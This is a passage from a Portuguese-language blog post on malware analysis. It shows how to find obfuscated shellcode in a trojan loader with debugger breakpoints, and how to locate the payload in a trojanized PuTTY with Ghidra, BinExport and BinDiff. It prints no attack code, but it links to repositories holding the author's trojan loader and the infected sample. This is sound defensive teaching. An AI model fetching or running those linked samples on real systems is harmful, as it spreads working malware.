<p>O trojan loader que produzi, que est√° <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a>, por exemplo, cont√©m um shellcode altamente ofuscado, mas que pode ser isolado facilmente utilizando a t√©cnica explicada (BP no <em>VirtualAlloc</em> e no <em>CreateThread</em>).</p>
<p>O breakpoint no VirtualAlloc nos traz um endere√ßo alocado na heap com as permiss√µes de leitura, escrita e execu√ß√£o - o que nos deixa suspeitos sobre ela (Figuras 0x0B e 0x0C).</p>

<img src="img/07befb4d81eeebf3253c2c8cb6e52296.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x0B - mem√≥ria alocada com VIrtualAlloc seguida no dump.</em></p>

<img src="img/bb9b61b24f638d7ef0567fa0577d67b9.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x0C - mem√≥ria alocada pelo VirtualAlloc √© RWX.</em></p>
<br>
<br>
<p>Seguindo no dump e executando at√© o <em>CreateThread</em>, √© poss√≠vel perceber que o espa√ßo alocado, anteriormente vazio, agora est√° preenchido de bytes (Figura 0x0D). Analisando no disassembler, √© poss√≠vel verificar instru√ß√µes iniciais e um loop de desofusca√ß√£o dos bytes seguintes (Figura 0x0E). Esses bytes v√°lidos e a rotina de desofusca√ß√£o tamb√©m v√°lida nos permite provar que esse √© o nosso shellcode!</p>

<img src="img/e08b5eba15cc729d8a098e005b886f08.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x0D - shellcode no dump antes de criar a thread de execu√ß√£o.</em></p>

<img src="img/77b6a26933035a2c7c239ea82ec421c1.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x0E - shellcode no disassembler ap√≥s desofusca√ß√£o inicial; apenas alguns step intos e executando todo o primeiro loop √† exaust√£o</em></p>
<br>
<br>
<h2 id="detectando-localiza√ß√£o-de-trojans-com-bindiff">Detectando localiza√ß√£o de trojans com BinDiff<a href="#detectando-localiza√ß√£o-de-trojans-com-bindiff" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Essa t√©cnica agiliza a an√°lise realizada em um execut√°vel trojanizado, caso o analista tenha acesso o software leg√≠timo. Dependendo do bin√°rio, m√∫ltiplas t√©cnicas de binary diffing podem ser empregadas - falaremos mais delas na an√°lise do putty infectado, citado na <a href="/posts/malware-analysis-0x00/#introdu√ß√£o">Introdu√ß√£o</a> desse artigo.</p>
<h3 id="mas-afinal-o-que-√©-bindiff">Mas afinal, o que √© BinDiff?<a href="#mas-afinal-o-que-√©-bindiff" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Binary diffing referem-se a algoritmos e ferramentas utilizadas para comparar diferen√ßas entre dois arquivos bin√°rios - como EXEs, DLLs, entre outros. Essas diferen√ßas podem ser uma simples altera√ß√£o de instru√ß√µes, inclus√£o/exclus√£o de rotinas inteiras ou mudan√ßa de fluxo dentro de uma fun√ß√£o, entre outros tipos de mudan√ßas.</p>
<p>BinDiff √© uma ferramenta, atualmente opensource, que compara dois bin√°rios com diversos algoritmos. √â poss√≠vel checar por similaridade de fun√ß√µes, fun√ß√µes inclu√≠das/exclu√≠das entre um e outro bin√°rio, obter estat√≠sticas (quantidade de fun√ß√µes, jumps, instru√ß√µes etc). Para utiliz√°-la, √© necess√°rio exportar os bin√°rios no formato <em>.BinDiff</em> - algo que pode ser feito pelo plugin binexport.</p>
<p>Al√©m de auxiliar na an√°lise de malware, algoritmos de binary diffing podem ajudar na aplica√ß√£o de patches, busca de vulnerabilidades em softwares mais antigos, entre outros usos.</p>
<h3 id="an√°lise-do-putty-infectado-com-bindiff">An√°lise do putty infectado com BinDiff<a href="#an√°lise-do-putty-infectado-com-bindiff" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Vamos √† an√°lise do putty infectado, dispon√≠vel <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/malware-analysis-0x00">nesse link</a>.</p>
<p>Para essa t√©cnica, √© necess√°rio a instala√ß√£o do <a href="https://ghidra-sre.org">Ghidra</a>, para an√°lise inicial e disassembly das instru√ß√µes, <a href="https://github.com/google/binexport/releases/tag/v12-20240417-ghidra_11.0.3">BinExport para Ghidra</a>, para gerar os arquivos de BinDiff a serem comparados, e o pr√≥prio software <a href="https://github.com/google/bindiff">BinDiff</a>, que ir√° comparar os arquivos gerados pelo plugin do BinExport.</p>
<p>Primeiramente, vamos analisar os bin√°rios - adicionar um projeto no ghidra, importar os dois EXEs, realizar a an√°lise automatizada inicial do EXE e salvar - o cotidiano de um analista de malware.</p>
<p>Ap√≥s a instala√ß√£o do BinExport e rein√≠cio do Ghidra, h√° a op√ß√£o de exportar os bin√°rios via clique secund√°rio (Figura 0x0F). Caso o BinExport tenha sido corretamente instalado, aparecer√° o formato &ldquo;Binary BinExport (v2) for BinDiff&rdquo;, e √© esse o export que queremos.</p>
<blockquote>
<p>Nota: realize esse processo apenas quando os bin√°rios j√° tiverem sido analisados pelo ghidra.</p>
</blockquote>

<img src="img/f1d644e630be91ebda8a973234b4d48c.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x0F - exporta√ß√£o dos arquivos BinDiff referentes ao arquivo leg√≠timo e ao infectado via Ghidra, p√≥s an√°lise automatizada.</em></p>
<br>
<br>
J√° no BinDiff, vamos criar um novo workspace e realizar a importa√ß√£o de um novo Diff: o primeiro sendo o bin√°rio leg√≠timo (putty.exe) e o segundo o trojan (putty_infected.exe) (Figura 0x10). Ap√≥s a importa√ß√£o, ao clicar duas vezes no Diff criado trar√° diversas informa√ß√µes sobre as diferen√ßas entre os bin√°rios (Figura 0x11).

<img src="img/49da4a38b2509f4fa871a266951bdeba.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x10 - importa√ß√£o dos artefatos gerados pelo Ghidra no software BinDiff.</em></p>

<img src="img/fdf7c7d2dc0441ac30c512eaca70402d.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x11 - an√°lises dispon√≠veis via software BinDiff para o caso analisado.</em></p>
<br>
<br>
Nesse ponto, v√°rias t√©cnicas podem ser empregadas para localizar a carga maliciosa: analisar as fun√ß√µes que est√£o presentes apenas no bin√°rio infectado, analisar o fluxo de chamadas, etc. No caso do putty, vamos primeiro verificar as fun√ß√µes que est√£o presentes em ambos os bin√°rios (Matched Functions).
<p>Uma an√°lise importante a ser realizada √© a de similaridade entre fun√ß√µes. Uma similaridade de 100% n√£o nos interessa, pois a fun√ß√£o n√£o foi adulterada. J√° uma similaridade m√©dia ou alta pode pode indicar uma adultera√ß√£o, ent√£o essas fun√ß√µes devem ser analisadas atentamente.</p>
<p>No caso do putty, temos apenas uma fun√ß√£o com similaridade diferente de 100%, para a nossa sorte (Figura 0x12). Essa fun√ß√£o √© o entrypoint do bin√°rio, local comum de infec√ß√£o para trojans. Clicando duas vezes na fun√ß√£o, obtemos o seguinte gr√°fico e disassembly:</p>

<img src="img/edfd64d3415428c55aa5ce54ff241257.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x12 - √∫nica fun√ß√£o com similaridade diferente de 100% nas fun√ß√µes presentes em ambos os bin√°rios.</em>
<br>
<br></p>
<p>Note que o entrypoint do bin√°rio leg√≠timo cont√©m apenas duas instru√ß√µes, enquanto que o entrypoint do bin√°rio infectado traz bem mais instru√ß√µes, al√©m de chamadas para fun√ß√µes suspeitas - <em>CreateThread</em> - (Figura 0x13).</p>

<img src="img/6c78637f1c85fdfd288f54f7a90505a0.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x13 - diferen√ßa do entrypoint do putty.exe (√† esquerda) e do putty_infected.exe (√† direita).</em>
<br>
<br></p>
<p>Ao verificar a localiza√ß√£o do c√≥digo que rodar√° em uma nova thread (<code>0x573047</code>) via Ghidra, √© poss√≠vel perceber a execu√ß√£o de algumas instru√ß√µes comumente vistas em shellcode (CLD, CALL aparentemente sem par√¢metros ou sem <em>caling convention</em> definida) (Figura 0x14).</p>
<p>O endere√ßo <code>0x5730d5</code> √© chamado pela CALL, redirecionando a execu√ß√£o para uma estrutura claramente relacionada a shellcode - push de valores semelhantes a API hashing, chamada de fun√ß√µes a partir de endere√ßos em registradores, aus√™ncia de chamada para APIs de DLLs a partir de <em>dynamic linking</em>, entre outros indicadores (Figura 0x15).</p>

<img src="img/17bdecea28143dbcfb87f9061d0a520b.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x14 - in√≠cio da fun√ß√£o executada via CreateThread (<code>0x573047</code>).</em></p>

<img src="img/23c289c79e35e8f4ad1dc338feccc8ca.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x15 - c√≥digo a ser executado posteriormente na mesma thread criada - o pr√≥prio shellcode (<code>0x5730d5</code>).</em></p>
<br>
<br>
Voltando ao BinDiff, tamb√©m seria poss√≠vel identificar parte do shellcode atrav√©s das fun√ß√µes que est√£o presentes apenas no bin√°rio infectado - outra forma de encontrar tais cargas maliciosas (Figura 0x16).

<img src="img/5e298de9402dedf6d927afc66e044a00.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x16 - identifica√ß√£o do shellcode via fun√ß√µes existentes apenas no bin√°rio infectado, no software BinDiff.</em></p>
<p>Dessa forma, conseguimos encontrar o shellcode e evid√™nci√°-lo em um reporte de an√°lise/pesquisa de malwares.</p>
<br>
<br>
<h1 id="conclus√£o">Conclus√£o<a href="#conclus√£o" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Nesse artigo, foi explicado o que era um trojan, seus tipos e cargas maliciosas executadas no computador-v√≠tima e t√©cnicas de detec√ß√£o, identifica√ß√£o e localiza√ß√£o da carga maliciosa desses malwares - em especial, para as t√©cnicas de infec√ß√£o empregadas pelo Metasploit Framework.</p>
<p>No pr√≥ximo artigo, analisaremos os shellcodes resultantes desses tipos de malware, atrav√©s de t√©cnicas de an√°lise de malwares.</p>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Ler outras postagens</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="https://blog.midnighthackings.com/posts/malware-analysis-0x01/" class="button inline prev">
        &lt; [<span class="button__text">Laborat√≥rio Seguro para An√°lise de Malware - An√°lise de Malware 0x01</span>]
      </a>
    
    
      ::
    
    
      <a href="https://blog.midnighthackings.com/posts/my-journey-into-pentest-0x01/" class="button inline next">
         [<span class="button__text">Pentest 0x01 - Information Gathering Pt 1</span>] &gt;
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Midnight Hackings apoia o fim da escala 6x1!</span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
